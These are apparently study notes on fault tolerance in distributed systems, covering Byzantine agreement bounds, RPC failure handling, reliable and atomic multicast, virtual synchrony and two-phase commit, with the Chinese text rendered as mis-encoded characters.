<h3 id="æŠ•ç¥¨-Voting"><a href="#æŠ•ç¥¨-Voting" class="headerlink" title="æŠ•ç¥¨ - Voting"></a>æŠ•ç¥¨ - Voting</h3><p>æ€»ç»“ç‚¹æ•°ä¸ºnï¼Œå…¶ä¸­æœ‰mä¸ªç»“ç‚¹å‡ºé”™ã€‚</p>
<p>æŠ•ç¥¨éœ€è¦å°‘æ•°æœä»å¤šæ•°ï¼Œæ‰€ä»¥å½“$n\ge 2m+1$ æ—¶ï¼Œèƒ½æ»¡è¶³è¦æ±‚ã€‚</p>
<h3 id="å£å¤´æ¶ˆæ¯-Oral-Message"><a href="#å£å¤´æ¶ˆæ¯-Oral-Message" class="headerlink" title="å£å¤´æ¶ˆæ¯ - Oral Message"></a>å£å¤´æ¶ˆæ¯ - Oral Message</h3><p>Aç»™Bå‘é€ä¸€åˆ™å£å¤´æ¶ˆæ¯ï¼ŒBä»…çŸ¥é“è¿™ä¸ªæ¶ˆæ¯æ˜¯Aå‘æ¥çš„ï¼Œä½†æ˜¯ä¸çŸ¥é“è¿™ä¸ªæ¶ˆæ¯æ˜¯Aäº§ç”Ÿçš„ï¼Œè¿˜æ˜¯Aä»åˆ«çš„é‚£é‡Œè½¬å‘æ¥çš„ã€‚</p>
<p><strong>å‰ææ¡ä»¶</strong></p>
<ol>
<li><p>Every message is delivered correctly</p>
<p>æ¶ˆæ¯ä¼šè¢«æ­£ç¡®åœ°ä¼ é€ã€‚</p>
</li>
<li><p>Receiver knows who sent message</p>
<p>æ¥å—è€…çŸ¥é“æ­¤æ¶ˆæ¯è°å‘çš„ã€‚</p>
</li>
<li><p>Absence of message can be detected</p>
<p>å¦‚æœæœ‰äººä¸å‘æ¶ˆæ¯ï¼Œä¹Ÿæ˜¯å¯ä»¥è¢«æ£€æµ‹åˆ°çš„ã€‚</p>
</li>
</ol>
<p><strong>ç»“è®º</strong></p>
<p>å½“$n\ge 3m + 1$æ—¶ï¼Œèƒ½æ»¡è¶³è¦æ±‚ã€‚</p>
<h3 id="å¸¦ç­¾åçš„æ¶ˆæ¯-Sign-Message"><a href="#å¸¦ç­¾åçš„æ¶ˆæ¯-Sign-Message" class="headerlink" title="å¸¦ç­¾åçš„æ¶ˆæ¯ - Sign Message"></a>å¸¦ç­¾åçš„æ¶ˆæ¯ - Sign Message</h3><p>åœ¨Oral Messageçš„å‰ææ¡ä»¶é‡Œå†æ·»åŠ ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<ol>
<li><p>Loyal generalâ€™s signature cannot be forged and contents cannot be altered.</p>
<p>å¿ è¯šçš„å°†å†›çš„ç­¾åä¸èƒ½è¢«ä¿®æ”¹ï¼Œå¯¹å¿ è¯šçš„å°†å†›çš„å‘å‡ºçš„æ¶ˆæ¯çš„ä¿®æ”¹èƒ½å¤Ÿè¢«æ£€æµ‹åˆ°ã€‚</p>
</li>
<li><p>Anyone can verify authenticity of signature.</p>
<p>ä»»ä½•äººéƒ½å¯ä»¥éªŒè¯ç­¾åçš„çœŸå®æ€§ã€‚</p>
</li>
</ol>
<p><strong>ç»“è®º</strong></p>
<p>å½“$n \ge m + 2$æ—¶ï¼Œèƒ½æ»¡è¶³è¦æ±‚ã€‚</p>
<h2 id="æ•…éšœæ£€æµ‹"><a href="#æ•…éšœæ£€æµ‹" class="headerlink" title="æ•…éšœæ£€æµ‹"></a>æ•…éšœæ£€æµ‹</h2><p><strong>æ ¸å¿ƒæ€æƒ³</strong></p>
<p>é€šè¿‡è¶…æ—¶æœºåˆ¶æ¥æ£€æµ‹æŸä¸ªè¿›ç¨‹æ˜¯å¦å‘ç”Ÿäº†æ•…éšœã€‚</p>
<p><strong>é—®é¢˜</strong></p>
<p>æ— æ³•åŒºåˆ†æ˜¯ç”±äºç½‘ç»œä¸å¯é è¿˜æ˜¯ç”±äºè¿›ç¨‹å‡ºç°äº†æ•…éšœå¯¼è‡´çš„è¶…æ—¶ã€‚</p>
<h2 id="å¯é é€šä¿¡"><a href="#å¯é é€šä¿¡" class="headerlink" title="å¯é é€šä¿¡"></a>å¯é é€šä¿¡</h2><h3 id="è¿œç¨‹è¿‡ç¨‹è°ƒç”¨-RPC-ä¸­çš„äº”ç§å¤±è´¥å½¢å¼"><a href="#è¿œç¨‹è¿‡ç¨‹è°ƒç”¨-RPC-ä¸­çš„äº”ç§å¤±è´¥å½¢å¼" class="headerlink" title="è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)ä¸­çš„äº”ç§å¤±è´¥å½¢å¼"></a>è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)ä¸­çš„äº”ç§å¤±è´¥å½¢å¼</h3><ol>
<li>å®¢æˆ·ä¸èƒ½å®šä½æœåŠ¡å™¨</li>
<li>å®¢æˆ·åˆ°æœåŠ¡å™¨çš„è¯·æ±‚æ¶ˆæ¯ä¸¢å¤±</li>
<li>æœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚ä¹‹åå´©æºƒ</li>
<li>ä»æœåŠ¡å™¨åˆ°å®¢æˆ·çš„å“åº”æ¶ˆæ¯ä¸¢å¤±</li>
<li>å®¢æˆ·åœ¨å‘é€è¯·æ±‚ä¹‹åå´©æºƒ</li>
</ol>
<h3 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h3><ol>
<li><p><strong>å®¢æˆ·ä¸èƒ½å®šä½æœåŠ¡å™¨:</strong></p>
<p>è®©é”™è¯¯æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ Just report back to client</p>
</li>
<li><p><strong>å®¢æˆ·åˆ°æœåŠ¡å™¨çš„è¯·æ±‚æ¶ˆæ¯ä¸¢å¤±</strong></p>
<p>ä½¿æ“ä½œç³»ç»Ÿæˆ–å®¢æˆ·å­˜æ ¹åœ¨å‘é€è¯·æ±‚æ—¶å¼€å¯ä¸€ä¸ªå®šæ—¶å™¨ï¼Œå¦‚æœå®šæ—¶å™¨è¶…æ—¶äº†è¿˜æ²¡æœ‰æ”¶åˆ°åº”ç­”ï¼Œå°±é‡å‘æ¶ˆæ¯ã€‚(ä¸ªäººæ„Ÿè§‰ç±»ä¼¼äºARQè‡ªåŠ¨è¯·æ±‚é‡å‘)<br>Just resend message (and use messageID to uniquely identify messages) åªéœ€é‡æ–°å‘é€æ¶ˆæ¯(å¹¶ä½¿ç”¨messageIDå”¯ä¸€æ ‡è¯†æ¶ˆæ¯)</p>
</li>
<li><p><strong>æœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚ä¹‹åå´©æºƒ</strong></p>
<p>éå¸¸éº»çƒ¦ï¼Œæœ‰ä¸‰ç§æƒ…å†µï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451820.png" alt="image-20190420202228923"></p>
<p><strong>å¯¹æœåŠ¡å™¨çš„æœŸæœ›:</strong></p>
<ol>
<li>è‡³å°‘ä¸€æ¬¡è¯­ä¹‰ï¼šåœ¨æœåŠ¡å™¨é‡å¯ä¹‹å‰(æˆ–è€…é‡æ–°ç»‘å®šåˆ°ä¸€ä¸ªæ–°çš„æœåŠ¡å™¨ä¹‹å‰)ç­‰å¾…å¹¶å†æ¬¡å°è¯•æ“ä½œã€‚<br>At-least-once-semantics: The server guarantees it will carry out an operation at least once, no matter what.</li>
<li>æœ€å¤šä¸€æ¬¡è¯­ä¹‰ï¼šç«‹å³æ”¾å¼ƒå¹¶æŠ¥å‘Šå¤±è´¥ã€‚<br>At-most-once-semantics: The server guarantees it will carry out an operation at most once, but possibly none at all.</li>
</ol>
<p><strong>å®¢æˆ·å¯é‡‡å–çš„4ç§ç­–ç•¥:</strong></p>
<ol>
<li>ä¸é‡å‘</li>
<li>æ€»æ˜¯é‡å‘</li>
<li>æ²¡æœ‰æ¥æ”¶åˆ°ç¬¬ä¸€æ¬¡è¯·æ±‚å·²ç»ä¼ é€åˆ°æœåŠ¡å™¨çš„ç¡®è®¤æ—¶æ‰é‡å‘</li>
<li>åªæœ‰æ¥å—åˆ°æœåŠ¡å™¨å‘é€çš„è¯·æ±‚ç¡®è®¤æ—¶æ‰é‡å‘</li>
</ol>
</li>
<li><p>ä»æœåŠ¡å™¨åˆ°å®¢æˆ·çš„å“åº”æ¶ˆæ¯ä¸¢å¤±</p>
<ol>
<li><p>æŒ‰å¹‚ç­‰çš„æ–¹å¼ç»„ç»‡æ‰€æœ‰çš„è¯·æ±‚</p>
</li>
<li><p>æ”¹è¿›ç‰ˆï¼šå®¢æˆ·ä¸ºæ¯ä¸€ä¸ªè¯·æ±‚åˆ†é…ä¸€ä¸ªåºåˆ—å·ï¼Œé€šè¿‡åœ¨æœåŠ¡å™¨ä¸Šè·Ÿè¸ªä»æ¯ä¸ªå®¢æˆ·æ”¶åˆ°çš„æœ€è¿‘åºåˆ—å·ï¼Œ</p>
<p>æœåŠ¡å™¨å¯ä»¥åˆ†è¾¨åŸå§‹çš„è¯·æ±‚ ä¸é‡å‘çš„è¯·æ±‚ï¼Œå¹¶æ‹’ç»æ‰§è¡Œç¬¬äºŒæ¬¡å‘å‡ºçš„è¯·æ±‚ï¼Œä½†æ˜¯æœåŠ¡å™¨è¿˜æ˜¯è¦å‘</p>
<p>å®¢æˆ·å‘é€å“åº”ã€‚</p>
</li>
</ol>
</li>
<li><p>å®¢æˆ·åœ¨å‘é€è¯·æ±‚ä¹‹åå´©æºƒ(å­¤å„¿é—®é¢˜)</p>
<p>å­¤å„¿ï¼šå¦‚æœå®¢æˆ·å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè¯·æ±‚åšä¸€äº›äº‹æƒ…ï¼Œä½†æ˜¯åœ¨æœåŠ¡å™¨å›å¤ä¹‹å‰å°±å´©æºƒäº†ï¼Œè¿™æ—¶è™½ç„¶è®¡ç®—æ˜¯æ´»åŠ¨çš„ï¼Œä½†æ˜¯æ²¡æœ‰åŒäº²ç­‰å¾…ç»“æœï¼Œè¿™ç§ä¸éœ€è¦çš„è®¡ç®—ç§°ä¸ºå­¤å„¿è®¡ç®—ã€‚</p>
<p>è§£å†³åŠæ³•(4ä¸ª)</p>
<ol>
<li><p><strong>å­¤å„¿æ¶ˆç­extermination</strong></p>
<p>åœ¨å®¢æˆ·å­˜æ ¹å‘é€RPCæ¶ˆæ¯ä¹‹å‰è¿›è¡Œè¿›è¡Œæ—¥å¿—è®°å½•æ¥è¯´æ˜è¦åšä»€ä¹ˆã€‚åœ¨å®¢æˆ·ç«¯é‡å¯ä¹‹åï¼Œå¯¹æ—¥å¿—è¿›è¡Œæ£€æŸ¥ç„¶å<strong>æ˜ç¡®</strong>çš„æ€æ­»å­¤å„¿ã€‚</p>
</li>
<li><p><strong>å†ç”Ÿreincarnation</strong></p>
<p>å½“å®¢æˆ·ç«¯é‡å¯æ—¶ï¼Œå°±å‘æ‰€æœ‰çš„æœºå™¨å¹¿æ’­ä¸€ä¸ªæ¶ˆæ¯è¯´æ˜<strong>ä¸€ä¸ªæ–°æ—¶æœŸçš„å¼€å§‹</strong>ï¼Œå½“è¿™æ ·çš„å¹¿æ’­åˆ°è¾¾åï¼Œ<strong>æ‰€æœ‰</strong>ä¸é‚£ä¸ªå®¢æˆ·æœ‰å…³çš„è¿œç¨‹è®¡ç®—éƒ½è¢«æ€æ­»ã€‚</p>
</li>
<li><p><strong>ä¼˜é›…å†ç”Ÿgentle reincarnation</strong></p>
<p>å½“æ—¶æœŸå¹¿æ’­åˆ°è¾¾æ—¶ï¼Œæ¯å°æœºå™¨éƒ½è¿›è¡Œæ£€æŸ¥æ¥æŸ¥çœ‹æ˜¯å¦å­˜åœ¨è¿œç¨‹è®¡ç®—ï¼Œå¦‚æœæœ‰ï¼Œå°±å°è¯•å®šä½ä»–çš„æ‹¥æœ‰è€…ï¼Œåªæœ‰å½“ä¸èƒ½æ‰¾åˆ°æ‹¥æœ‰è€…çš„æ—¶å€™æ‰æ€æ­»è¯¥å­¤å„¿ã€‚</p>
</li>
<li><p><strong>åˆ°æœŸexpiration</strong></p>
<p>æ¯ä¸ªRPCéƒ½è¢«ç»™å®šä¸€ä¸ªæ ‡å‡†çš„æ—¶é—´é‡Tæ¥è¿›è¡Œå·¥ä½œï¼Œå¦‚æœåˆ°æ—¶ä¸èƒ½ç»“æŸï¼Œå°±å¿…é¡»æ˜¾ç¤ºçš„è¯·æ±‚å¦å¤–çš„æ—¶é—´é‡ã€‚(ç±»ä¼¼äºç§Ÿçº¦)</p>
</li>
</ol>
</li>
</ol>
<h2 id="å¯é çš„ç»„é€šä¿¡"><a href="#å¯é çš„ç»„é€šä¿¡" class="headerlink" title="å¯é çš„ç»„é€šä¿¡"></a>å¯é çš„ç»„é€šä¿¡</h2><h3 id="åŸºæœ¬çš„å¯é å¤šæ’­æ–¹æ³•"><a href="#åŸºæœ¬çš„å¯é å¤šæ’­æ–¹æ³•" class="headerlink" title="åŸºæœ¬çš„å¯é å¤šæ’­æ–¹æ³•"></a>åŸºæœ¬çš„å¯é å¤šæ’­æ–¹æ³•</h3><p>ç®€å•ä¸€æï¼Œå°±æ˜¯ä¿è¯æ¶ˆæ¯ä¸ä¸¢å¤±ã€‚ Simple reliability: No messages lost.</p>
<h3 id="æ— ç­‰çº§çš„åé¦ˆæ§åˆ¶"><a href="#æ— ç­‰çº§çš„åé¦ˆæ§åˆ¶" class="headerlink" title="æ— ç­‰çº§çš„åé¦ˆæ§åˆ¶"></a>æ— ç­‰çº§çš„åé¦ˆæ§åˆ¶</h3><p>ä¸€ç§ç±»ä¼¼äºåˆ†å±‚æ¬¡çš„å¤šæ’­ï¼Œå–äº†å£æ°´ï¼Œä¸è®²äº†ã€‚</p>
<h3 id="åŸå­å¤šæ’­"><a href="#åŸå­å¤šæ’­" class="headerlink" title="åŸå­å¤šæ’­"></a>åŸå­å¤šæ’­</h3><h4 id="è™šæ‹ŸåŒæ­¥-virtually-synchronous-é—®é¢˜"><a href="#è™šæ‹ŸåŒæ­¥-virtually-synchronous-é—®é¢˜" class="headerlink" title="è™šæ‹ŸåŒæ­¥(virtually synchronous)é—®é¢˜"></a>è™šæ‹ŸåŒæ­¥(virtually synchronous)é—®é¢˜</h4><ol>
<li>ä¿è¯å¤šæ’­åˆ°ç»„è§†å›¾Gçš„æ¶ˆæ¯è¢«ä¼ é€ç»™Gä¸­çš„æ¯ä¸ªæ­£å¸¸è¿›ç¨‹ã€‚</li>
<li>å¦‚æœæ¶ˆæ¯çš„å‘é€æ–¹åœ¨å¤šæ’­æœŸé—´å´©æºƒï¼Œé‚£ä¹ˆæ¶ˆæ¯è¦ä¹ˆè¢«æŠ•é€’ç»™æ‰€æœ‰çš„è¿›ç¨‹ï¼Œè¦ä¹ˆè¢«æ¯ä¸ªè¿›ç¨‹å¿½ç•¥ã€‚</li>
</ol>
<p><strong>æ‰€æœ‰æ²¡æœ‰åçš„èŠ‚ç‚¹åº”è¯¥çœ‹åˆ°ç›¸åŒçš„ä¿¡æ¯</strong></p>
<p><strong>ä¿è¯1ã€2ä¸¤ä¸ªå±æ€§çš„å¯é å¤šæ’­è¢«ç§°ä¸ºè™šæ‹ŸåŒæ­¥ã€‚</strong></p>
<p><strong>ä¾‹:</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451822.png" alt="image-20190420211038641"></p>
<p>P3åœ¨å‘é€æ¶ˆæ¯çš„æ—¶å€™å´©æºƒäº†ï¼Œåœ¨å´©æºƒä¹‹å‰ï¼Œå®ƒæˆåŠŸåœ°å°†æ¶ˆæ¯å¤šæ’­åˆ°äº†è¿›ç¨‹P2å’ŒP4ï¼Œä½†æ˜¯æ²¡æœ‰å¤šæ’­åˆ°P1ã€‚è™šæ‹ŸåŒæ­¥ä¿è¯è¿™ä¸ªæ¶ˆæ¯æ ¹æœ¬ä¸ä¼šè¢«ä¼ é€ã€‚</p>
<p><strong>åŸç†</strong></p>
<p>è™šæ‹ŸåŒæ­¥çš„åŸç†æ˜¯æ‰€æœ‰çš„å¤šæ’­éƒ½åœ¨è§†å›¾æ”¹å˜ä¹‹é—´è¿›è¡Œï¼Œå³ï¼Œè§†å›¾æ”¹å˜ä½œä¸ºä¸€ä¸ªå±éšœï¼Œä¸èƒ½è·¨è¶Šå®ƒè¿›è¡Œå¤šæ’­ã€‚</p>
<h4 id="æ¶ˆæ¯æ’åº"><a href="#æ¶ˆæ¯æ’åº" class="headerlink" title="æ¶ˆæ¯æ’åº"></a>æ¶ˆæ¯æ’åº</h4><p><strong>æœ‰å››ç§æ¶ˆæ¯æ’åºæ–¹æ³•</strong>ï¼š</p>
<ol>
<li><p><strong>ä¸æ’åºçš„å¤šæ’­</strong></p>
<p>æ˜¯ä¸€ç§è™šæ‹ŸåŒæ­¥å¤šæ’­ï¼Œå®ƒå¯¹æ¥å—ä¸åŒè¿›ç¨‹å‘é€çš„æ¶ˆæ¯çš„æ¬¡åºä¸åšä»»ä½•ä¿è¯ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451823.png" alt="image-20190420213116254"></p>
<p>P1ç»™P2å’ŒP3å‘ç»„å†…å¤šæ’­ï¼Œç”±äºæ²¡æœ‰æ¥å—æ¶ˆæ¯é¡ºåºçš„çº¦æŸï¼ŒP2P3çš„æ¥å—é¡ºåºå¯èƒ½ä¸åŒã€‚</p>
</li>
<li><p><strong>FIFOé¡ºåºçš„å¤šæ’­</strong></p>
<p>é€šä¿¡å±‚è¢«å¼ºåˆ¶æŒ‰ç…§æ¶ˆæ¯å‘é€çš„é¡ºåºä¼ é€æ¥è‡ª<strong>åŒä¸€è¿›ç¨‹</strong>çš„æ¶ˆæ¯ï¼Œå¯¹ä¸åŒè¿›ç¨‹ä¹‹é—´çš„é¡ºåºä¸ä½œè¦æ±‚ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451824.png" alt="image-20190420213306494"></p>
<p>å¦‚ä¸Šå›¾ï¼Œä¸ä¿è¯m1ï¼Œm3ä¹‹é—´çš„å…³ç³»ï¼Œæ‰€ä»¥å¯¹äºP2å’ŒP3ï¼Œåªè¦m1åœ¨m2ä¹‹å‰ï¼Œm3åœ¨m4ä¹‹å‰ï¼Œå°±æ»¡è¶³è¦æ±‚ã€‚</p>
</li>
<li><p><strong>æŒ‰å› æœå…³ç³»æ’åºçš„å¤š</strong></p>
<p>ä¼ é€æ¶ˆæ¯å¯ä»¥ä¿ç•™ä¸åŒæ¶ˆæ¯ä¹‹é—´çš„æ½œåœ¨å› æœå…³ç³»ã€‚å¦‚æœm1å’Œm2ä¹‹é—´æœ‰å› æœå…³ç³»ï¼Œm1åº”è¯¥åœ¨m2ä¹‹å‰ï¼Œé‚£ä¹ˆæ¯ä¸ªæ¥æ”¶æ–¹åœ¨æ¥å—å¹¶å‘ä¸Šäº¤ä»˜æ¶ˆæ¯æ—¶ï¼Œéƒ½åº”è¯¥å…ˆäº¤ä»˜m1å†äº¤ä»˜m2ã€‚</p>
</li>
<li><p><strong>å…¨åºå¤šæ’­</strong></p>
<p>ä¸è®ºæ¶ˆæ¯ä¼ é€æ˜¯æ— åºï¼ŒFIFOé¡ºåºè¿˜æ˜¯æŒ‰å› æœå…³ç³»æ’åºï¼Œéƒ½éœ€è¦åœ¨ä¼ é€æ¶ˆæ¯æ—¶ï¼Œå¯¹æ‰€æœ‰çš„ç»„æˆå‘˜æŒ‰ç…§ç›¸åŒçš„æ¬¡åºæ¥ä¼ é€ã€‚</p>
</li>
<li><p><strong>åŸå­å¤šæ’­</strong></p>
<p>æä¾›äº†å…¨åºçš„æ¶ˆæ¯ä¼ é€çš„è™šæ‹ŸåŒæ­¥å¯é æ€§å¤šæ’­ç§°ä¸º<strong>åŸå­å¤šæ’­</strong>ã€‚</p>
</li>
</ol>
<p><strong>æ¯”è¾ƒ</strong></p>
<table>
<thead>
<tr>
<th align="left">Multicast</th>
<th align="left">Basic Message Ordering</th>
<th align="left">Total-ordered Delivery?</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Reliable multicast</td>
<td align="left">None</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">FIFO multicast</td>
<td align="left">FIFO-ordered delivery</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">Causal multicast</td>
<td align="left">Causal-ordered delivery</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">Atomic multicast</td>
<td align="left">None</td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">FIFO atomic multicast</td>
<td align="left">FIFO-ordered delivery</td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">Causal atomic multicast</td>
<td align="left">Causal-ordered delivery</td>
<td align="left">Yes</td>
</tr>
</tbody></table>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451825.png" alt="image-20190420214930797"></p>
<h4 id="è™šæ‹ŸåŒæ­¥çš„å®ç°"><a href="#è™šæ‹ŸåŒæ­¥çš„å®ç°" class="headerlink" title="è™šæ‹ŸåŒæ­¥çš„å®ç°"></a>è™šæ‹ŸåŒæ­¥çš„å®ç°</h4><p>æ¶ˆæ¯måœ¨å‘é€å‘å®Œæˆå¤šæ’­ä¹‹å‰å´©æºƒï¼Œæ‰€ä»¥æ²¡æœ‰æ¥æ”¶åˆ°mçš„è¿›ç¨‹åº”è¯¥ä»å…¶ä»–åœ°æ–¹çŸ¥é“ä»–ä¸¢å¤±äº†æ¶ˆæ¯ã€‚</p>
<p><strong>ç¨³å®š</strong></p>
<p>å¦‚æœç»„Gä¸­æ‰€æœ‰è¿›ç¨‹éƒ½æ¥æ”¶åˆ°äº†mï¼Œåˆ™ç§°mæ˜¯ç¨³å®šçš„ã€‚</p>
<p><strong>å®ç°åŸç†</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451826.png" alt="image-20190420215708876"></p>
<ol>
<li><p>å¦‚å›¾æ‰€ç¤ºï¼Œè¿›ç¨‹4æ¢æµ‹åˆ°è¿›ç¨‹7å´©æºƒï¼Œäºæ˜¯å®ƒå‘æ‰€æœ‰è¿›ç¨‹å‘é€view changeæ¶ˆæ¯ã€‚</p>
</li>
<li><p>è¿›ç¨‹6å‘é€è‡ªèº«çš„æ‰€æœ‰ä¸ç¨³å®šæ¶ˆæ¯ï¼Œç„¶åå‘é€ä¸€ä¸ªflush messageã€‚(çœ‹çœ‹åˆ«çš„è¿›ç¨‹æœ‰æ²¡æœ‰æ”¶åˆ°ï¼Œè¿›ç¨‹6è¯´:æˆ‘è®¤ä¸ºè¿™äº›æ¶ˆæ¯æ˜¯ä¸ç¨³å®šçš„ï¼Œä½ ä»¬æ¥çœ‹çœ‹ï¼Œä½ å†æŠŠä¸ç¨³å®šçš„å‘ç»™æˆ‘ï¼Œç„¶åå† æ¥åˆ†å¸ƒå¼å†³ç­–)</p>
</li>
<li><p>å…¶ä½™è¿›ç¨‹ç»™è¿›ç¨‹6åé¦ˆä¸€ä¸ªflushæ¶ˆæ¯ï¼Œå½“è¿›ç¨‹6ä»å…¶ä»–æ¯ä¸ªè¿›ç¨‹é‚£é‡Œéƒ½æ¥å—åˆ°ä¸€ä¸ªflushæ¶ˆæ¯æ—¶å°±å»ºç«‹äº†ä¸€ä¸ªæ–°çš„è§†å›¾ã€‚</p>
</li>
<li><p>wangyué—®ï¼šå¦‚ä½•çŸ¥é“æ˜¯ä¸ç¨³å®šçš„æ¶ˆæ¯ï¼Ÿ</p>
<p>ä¸å–æ°´ç­”ï¼šæ ¹æ®view changeæ¶ˆæ¯æ¥åˆ¤æ–­ã€‚4å‘é€äº†è¿›ç¨‹7çš„view changeæ¶ˆæ¯ï¼Œæ‰€ä»¥åˆ«äººå°±çŸ¥é“å…³äº7çš„æœ‰å¯èƒ½æ˜¯ä¸ç¨³å®šçš„æ¶ˆæ¯äº†ã€‚</p>
</li>
</ol>
<h2 id="åˆ†å¸ƒå¼æäº¤"><a href="#åˆ†å¸ƒå¼æäº¤" class="headerlink" title="åˆ†å¸ƒå¼æäº¤"></a>åˆ†å¸ƒå¼æäº¤</h2><p>å®é™…ä¸Šå¾ˆç®€å•ï¼Œæ˜¯ä¸€ä¸ªäº‹åŠ¡å¤„ç†çš„é—®é¢˜ã€‚éº»çƒ¦åœ¨äºåˆ†å¸ƒå¼ï¼Œæ¶‰åŠåˆ°äº†åä½œçš„é—®é¢˜ã€‚</p>
<h3 id="ä¸¤é˜¶æ®µæäº¤"><a href="#ä¸¤é˜¶æ®µæäº¤" class="headerlink" title="ä¸¤é˜¶æ®µæäº¤"></a>ä¸¤é˜¶æ®µæäº¤</h3><p>å¼•å…¥äº†åè°ƒè€…çš„æ¦‚å¿µã€‚å…·ä½“æ“ä½œå¦‚ä¸‹:</p>
<ol>
<li><p>åä½œè€…å‘æ‰€æœ‰çš„å‚ä¸è€…å‘é€ä¸€ä¸ªVOTE_REQUESTæ¶ˆæ¯ã€‚</p>
</li>
<li><p>å½“å‚ä¸è€…æ¥æ”¶åˆ°VOTE_REQUESTæ¶ˆæ¯æ—¶ï¼Œå°±å‘åä½œè€…è¿”å›ä¸€ä¸ªVOTE_COMMITæ¶ˆæ¯é€šçŸ¥åä½œè€…å®ƒå·²ç»</p>
<p>å‡†å¤‡å¥½æœ¬åœ°æäº¤äº‹åŠ¡ä¸­å±äºå®ƒçš„éƒ¨åˆ†ï¼Œå¦åˆ™å°±è¿”å›ä¸€ä¸ªVOTE_ABORTæ¶ˆæ¯ã€‚</p>
</li>
<li><p>åä½œè€…æ”¶é›†æ¥è‡ªå‚ä¸è€…çš„æ‰€æœ‰é€‰ç¥¨ï¼Œå¦‚æœæ‰€æœ‰çš„å‚ä¸è€…éƒ½è¡¨å†³è¦æäº¤äº‹åŠ¡ï¼Œé‚£ä¹ˆåä½œè€…å°±è¿›è¡Œæäº¤ã€‚åœ¨</p>
<p>è¿™ç§æƒ…å†µä¸‹å®ƒå‘æ‰€æœ‰çš„å‚ä¸è€…å‘é€ä¸€ä¸ªGLOBAL_COMMITæ¶ˆæ¯ã€‚ä½†æ˜¯ï¼Œå¦‚æœ<strong>æœ‰ä¸€ä¸ª</strong>å‚ä¸è€…è¡¨å†³è¦å–æ¶ˆäº‹</p>
<p>ç‰©ï¼Œé‚£ä¹ˆåä½œè€…å°±å†³å®šå–æ¶ˆäº‹åŠ¡å¹¶å¤šæ’­ä¸€ä¸ªGLOBAL_ABORTæ¶ˆæ¯ã€‚</p>
</li>
<li><p>æ¯ä¸ªæäº¤è¡¨å†³çš„å‚ä¸è€…éƒ½ç­‰å¾…åä½œè€…çš„æœ€åååº”ã€‚å¦‚æœå‚ä¸è€…æ¥æ”¶åˆ°ä¸€ä¸ªGLOBAL_COMMITæ¶ˆæ¯ï¼Œé‚£</p>
<p>ä¹ˆä»–å°±åœ¨æœ¬åœ°æäº¤äº‹åŠ¡ï¼Œå¦åˆ™å½“æ¥æ”¶åˆ°ä¸€ä¸ªGLOBAL_ABORTæ¶ˆæ¯æ—¶ï¼Œå°±å–æ¶ˆæœ¬åœ°äº‹åŠ¡ã€‚</p>
</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451827.png" alt="image-20190420220521993"></p>
<h4 id="ä»€ä¹ˆæ—¶å€™é˜»å¡é—®é¢˜"><a href="#ä»€ä¹ˆæ—¶å€™é˜»å¡é—®é¢˜" class="headerlink" title="ä»€ä¹ˆæ—¶å€™é˜»å¡é—®é¢˜"></a>ä»€ä¹ˆæ—¶å€™é˜»å¡é—®é¢˜</h4><ol>
<li>å‚ä¸è€…å¯èƒ½åœ¨INITçŠ¶æ€ç­‰å¾…æ¥è‡ªåä½œè€…çš„VOTE_REQUESTæ¶ˆæ¯ï¼›</li>
<li>åä½œè€…å¯èƒ½åœ¨WAITçŠ¶æ€é˜»å¡ï¼Œç­‰å¾…æ¥è‡ªæ¯ä¸ªå‚ä¸è€…çš„è¡¨å†³ï¼›</li>
<li>å‚ä¸è€…å¯èƒ½åœ¨READYçŠ¶æ€é˜»å¡ï¼Œç­‰å¾…åä½œè€…å‘é€çš„å…¨å±€è¡¨å†³æ¶ˆæ¯ã€‚</li>
</ol>
<h4 id="ä¸å¯é é—®é¢˜-ç®€å•æäº†ä¸€å¥"><a href="#ä¸å¯é é—®é¢˜-ç®€å•æäº†ä¸€å¥" class="headerlink" title="ä¸å¯é é—®é¢˜(ç®€å•æäº†ä¸€å¥)"></a>ä¸å¯é é—®é¢˜(ç®€å•æäº†ä¸€å¥)</h4><ol>
<li>COMMITçš„æ—¶å€™æœ‰å¯èƒ½å¤±è´¥</li>
<li>æ¯ä¸€å°æœºå™¨ä¹Ÿæœ‰å¯èƒ½å¤±è´¥</li>
<li>è¶…æ—¶Time Outé—®é¢˜</li>
</ol>
<h3 id="ä¸‰é˜¶æ®µæäº¤"><a href="#ä¸‰é˜¶æ®µæäº¤" class="headerlink" title="ä¸‰é˜¶æ®µæäº¤"></a>ä¸‰é˜¶æ®µæäº¤</h3><p>å–å£æ°´ï¼Œä¸è®²äº†</p>
<h2 id="æ¢å¤"><a href="#æ¢å¤" class="headerlink" title="æ¢å¤"></a>æ¢å¤</h2><p>ä¹¦ä¸Šåªæ˜¯ç®€å•ä¸¾äº†å‡ ä¸ªæ —å­ï¼Œäº†è§£ä¸€ä¸‹ï¼Œæˆ‘ä»¬å°±ä¸€èµ·æ¥äº†è§£ä¸€ä¸‹ï¼Œå°±ä¸æ‰©å±•å¤ªå¤šäº†ã€‚</p>
